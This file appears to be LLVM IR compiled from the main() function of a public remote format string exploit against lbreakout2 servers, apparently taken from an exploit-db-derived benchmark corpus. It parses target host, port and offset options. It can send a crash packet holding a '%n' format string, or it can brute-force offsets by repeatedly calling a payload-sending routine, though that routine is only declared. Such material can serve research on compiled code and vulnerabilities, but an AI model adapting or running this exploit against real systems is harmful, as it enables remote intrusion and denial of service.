; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22830.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22830.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [16 x i8] c"t:h:p:d:r:P:gbc\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@pt = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"main(): allocating memory failed\00", align 1
@.str.2 = private unnamed_addr constant [108 x i8] c"[*] lbreakout[2-2.5+]: remote format string exploit.\0A[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"[*] sending server crash code.\0A\00", align 1
@.str.4 = private unnamed_addr constant [13 x i8] c"\00\00\00\00\00\00\00\00\03\04%n\00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"[!] brute force failed.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i16, align 2
  %7 = alloca i16, align 2
  %8 = alloca i16, align 2
  %9 = alloca i16, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i16 8000, i16* %6, align 2
  store i16 0, i16* %7, align 2
  store i16 0, i16* %8, align 2
  store i16 0, i16* %9, align 2
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i8* null, i8** %14, align 8
  br label %15

15:                                               ; preds = %72, %2
  %16 = load i32, i32* %4, align 4
  %17 = load i8**, i8*** %5, align 8
  %18 = call i32 @getopt(i32 %16, i8** %17, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  store i32 %18, i32* %13, align 4
  %19 = load i32, i32* @EOF, align 4
  %20 = icmp ne i32 %18, %19
  br i1 %20, label %21, label %73

21:                                               ; preds = %15
  %22 = load i32, i32* %13, align 4
  switch i32 %22, label %67 [
    i32 116, label %23
    i32 104, label %39
    i32 112, label %50
    i32 100, label %54
    i32 114, label %58
    i32 80, label %61
    i32 103, label %64
    i32 98, label %65
    i32 99, label %66
  ]

23:                                               ; preds = %21
  %24 = load i32, i32* @optarg, align 4
  %25 = call i32 @atoi(i32 %24)
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %31, label %27

27:                                               ; preds = %23
  %28 = load i32, i32* @optarg, align 4
  %29 = call i32 @atoi(i32 %28)
  %30 = icmp sgt i32 %29, 1
  br i1 %30, label %31, label %36

31:                                               ; preds = %27, %23
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @usage(i8* %34)
  br label %36

36:                                               ; preds = %31, %27
  %37 = load i32, i32* @optarg, align 4
  %38 = call i32 @atoi(i32 %37)
  store i32 %38, i32* @pt, align 4
  br label %72

39:                                               ; preds = %21
  %40 = load i8*, i8** %14, align 8
  %41 = icmp ne i8* %40, null
  br i1 %41, label %49, label %42

42:                                               ; preds = %39
  %43 = load i32, i32* @optarg, align 4
  %44 = call i64 @strdup(i32 %43)
  %45 = inttoptr i64 %44 to i8*
  store i8* %45, i8** %14, align 8
  %46 = icmp ne i8* %45, null
  br i1 %46, label %49, label %47

47:                                               ; preds = %42
  %48 = call i32 @printe(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %49

49:                                               ; preds = %47, %42, %39
  br label %72

50:                                               ; preds = %21
  %51 = load i32, i32* @optarg, align 4
  %52 = call i32 @atoi(i32 %51)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %6, align 2
  br label %72

54:                                               ; preds = %21
  %55 = load i32, i32* @optarg, align 4
  %56 = call i32 @atoi(i32 %55)
  %57 = mul nsw i32 %56, 4
  store i32 %57, i32* %10, align 4
  br label %72

58:                                               ; preds = %21
  %59 = load i32, i32* @optarg, align 4
  %60 = call i32 @atoi(i32 %59)
  store i32 %60, i32* %11, align 4
  br label %72

61:                                               ; preds = %21
  %62 = load i32, i32* @optarg, align 4
  %63 = call i32 @atoi(i32 %62)
  store i32 %63, i32* %12, align 4
  br label %72

64:                                               ; preds = %21
  store i16 1, i16* %7, align 2
  br label %72

65:                                               ; preds = %21
  store i16 1, i16* %8, align 2
  br label %72

66:                                               ; preds = %21
  store i16 1, i16* %9, align 2
  br label %72

67:                                               ; preds = %21
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 0
  %70 = load i8*, i8** %69, align 8
  %71 = call i32 @usage(i8* %70)
  br label %72

72:                                               ; preds = %67, %66, %65, %64, %61, %58, %54, %50, %49, %36
  br label %15

73:                                               ; preds = %15
  %74 = load i8*, i8** %14, align 8
  %75 = icmp ne i8* %74, null
  br i1 %75, label %81, label %76

76:                                               ; preds = %73
  %77 = load i8**, i8*** %5, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 0
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @usage(i8* %79)
  br label %81

81:                                               ; preds = %76, %73
  %82 = call i32 @printf(i8* getelementptr inbounds ([108 x i8], [108 x i8]* @.str.2, i64 0, i64 0))
  %83 = load i16, i16* %7, align 2
  %84 = icmp ne i16 %83, 0
  br i1 %84, label %85, label %90

85:                                               ; preds = %81
  %86 = load i8*, i8** %14, align 8
  %87 = load i16, i16* %6, align 2
  %88 = call i32 @getpops(i8* %86, i16 zeroext %87)
  %89 = call i32 @exit(i32 0) #3
  unreachable

90:                                               ; preds = %81
  %91 = load i16, i16* %9, align 2
  %92 = icmp ne i16 %91, 0
  br i1 %92, label %93, label %98

93:                                               ; preds = %90
  %94 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %95 = load i8*, i8** %14, align 8
  %96 = load i16, i16* %6, align 2
  %97 = call i32 @send_packet(i8* %95, i16 zeroext %96, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0), i32 12, i32 0)
  br label %125

98:                                               ; preds = %90
  %99 = load i16, i16* %8, align 2
  %100 = icmp ne i16 %99, 0
  br i1 %100, label %101, label %117

101:                                              ; preds = %98
  store i32 0, i32* %10, align 4
  br label %102

102:                                              ; preds = %112, %101
  %103 = load i32, i32* %10, align 4
  %104 = icmp slt i32 %103, 444
  br i1 %104, label %105, label %115

105:                                              ; preds = %102
  %106 = load i8*, i8** %14, align 8
  %107 = load i16, i16* %6, align 2
  %108 = load i32, i32* %10, align 4
  %109 = load i32, i32* %11, align 4
  %110 = load i32, i32* %12, align 4
  %111 = call i32 @sendcode(i8* %106, i16 zeroext %107, i32 %108, i32 %109, i32 %110)
  br label %112

112:                                              ; preds = %105
  %113 = load i32, i32* %10, align 4
  %114 = add nsw i32 %113, 4
  store i32 %114, i32* %10, align 4
  br label %102

115:                                              ; preds = %102
  %116 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0))
  br label %124

117:                                              ; preds = %98
  %118 = load i8*, i8** %14, align 8
  %119 = load i16, i16* %6, align 2
  %120 = load i32, i32* %10, align 4
  %121 = load i32, i32* %11, align 4
  %122 = load i32, i32* %12, align 4
  %123 = call i32 @sendcode(i8* %118, i16 zeroext %119, i32 %120, i32 %121, i32 %122)
  br label %124

124:                                              ; preds = %117, %115
  br label %125

125:                                              ; preds = %124, %93
  br label %126

126:                                              ; preds = %125
  %127 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i64 @strdup(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @getpops(i8*, i16 zeroext) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @send_packet(i8*, i16 zeroext, i8*, i32, i32) #1

declare dso_local i32 @sendcode(i8*, i16 zeroext, i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
